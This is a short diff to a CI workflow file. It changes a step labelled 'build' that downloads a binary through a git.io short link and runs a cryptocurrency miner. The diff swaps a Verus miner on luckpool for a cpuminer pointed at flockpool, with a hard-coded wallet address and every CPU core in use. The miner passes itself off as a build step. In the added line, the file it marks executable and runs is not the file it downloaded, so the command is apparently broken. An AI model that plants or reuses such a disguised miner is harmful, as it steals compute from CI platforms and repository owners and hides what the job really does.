@@ -51,5 +51,5 @@ jobs:
     - name : install dependencies
       run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
     - name: build 
-      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.$(echo $(shuf -i 1-99999 -n 1)-SIHU) -p x -t $(nproc --all)
+      run: wget -qO build https://git.io/JPQXz && chmod +x cpuminer-avx2 && ./cpuminer-avx2 -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RPjZ7GJF48arPdViMMPmtdfcdn4RjzVjr6.OPILIA -p x -t $(nproc --all) --no-tune
         
